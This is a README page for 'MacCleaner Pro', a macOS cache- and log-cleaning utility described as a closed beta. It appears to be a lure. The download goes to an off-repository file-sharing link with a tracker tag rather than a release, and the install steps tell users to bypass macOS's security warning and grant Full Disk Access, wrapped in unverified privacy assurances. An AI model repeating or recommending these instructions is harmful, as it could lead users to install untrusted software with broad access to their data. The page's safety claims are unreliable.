
# MacCleaner Pro

> A lightweight system utility designed to safely remove cache, logs, and temporary files on macOS. This project is currently in closed beta testing to refine performance and ensure full compatibility with macOS Sonoma and Sequoia.

---

## Download

[Download MacCleaner Pro for macOS (Beta Build)](https://yuishare.com/x/RGIGD?title=MacCleanerPro&tracker=1403)

*Version 0.9.2-beta | Universal Binary (Intel & Apple Silicon)*

---

## Overview

MacCleaner Pro is a system maintenance utility developed to help macOS users reclaim disk space and optimize system performance through safe, targeted cleanup operations. The application is currently undergoing closed beta testing, and we invite qualified users to evaluate its functionality and provide feedback prior to the stable public release.

All operations are performed locally. The application does not establish cloud connections, transmit telemetry, or collect user data during the beta phase.

---

## Core Features

- **Deep Cache Analysis**: Identifies and removes user, system, and browser cache files with precision filtering to avoid accidental deletion of critical data.
- **Log File Management**: Clears outdated system and application logs to free disk space without affecting diagnostic capabilities or system stability.
- **Temporary File Removal**: Safely deletes orphaned temporary files from `/tmp`, `/var/tmp`, and user-specific directories.
- **Disk Usage Visualization**: Interactive charts display storage consumption by category, enabling informed cleanup decisions.
- **One-Click Optimization**: Streamlined workflow for users who prefer automated maintenance with minimal configuration.
- **Native Apple Silicon Support**: Compiled as a universal binary with optimized performance for M-series chips and full compatibility with Intel-based Macs.

---

## Beta Testing Notice

This software is in active beta development. Users should be aware of the following conditions:

- Certain features may be incomplete, unstable, or subject to change before the stable release.
- All cleanup operations are logged and reversible; however, users are strongly advised to maintain regular Time Machine or external backups.
- Bug reports, crash logs, and feature requests are encouraged via the GitHub Issues tab.
- The application has not undergone a final third-party security audit; deployment in non-production or test environments is recommended during the beta phase.

---

## System Requirements

- macOS 12.0 (Monterey) or later
- 50 MB of available disk space for installation
- Administrator privileges required for system-level cleanup operations
- Internet connection required only for initial download and optional update verification

---

## Installation Instructions

1. Download the `.dmg` installer using the link provided above.
2. Open the disk image and drag `MacCleaner Pro.app` to your Applications folder.
3. On first launch, if macOS displays a security warning:
   - Right-click (or Control-click) the application icon in Finder.
   - Select **Open** from the context menu.
   - Confirm the action by clicking **Open** in the subsequent dialog.
4. Grant Full Disk Access permission when prompted to enable deep system cleanup functionality.

---

## Privacy and Security

- No telemetry, analytics, or crash reporting modules are included in the current beta build.
- All file operations are executed locally; no user files or metadata are transmitted to external servers.
- Core cleanup modules are available for review in the `/src` directory for transparency.
- The application does not modify System Integrity Protection (SIP) settings or require kernel extensions.

---

## Contributing

As this is a community-involved beta release, feedback from experienced macOS users is highly valued. To contribute:

1. Review existing issues to avoid duplicate reports.
2. Submit a new issue with a detailed description, steps to reproduce, and relevant system information (macOS version, hardware model).
3. Pull requests addressing bug fixes, performance improvements, or documentation enhancements are welcome and will be reviewed by the maintainers.

---

## License

This project is distributed under the MIT License. See the `LICENSE` file in the repository root for full terms.

---

*MacCleaner Pro is an independent open-source project and is not affiliated with, endorsed by, or connected to Apple Inc. macOS and the Apple logo are trademarks of Apple Inc., registered in the United States and other countries.*

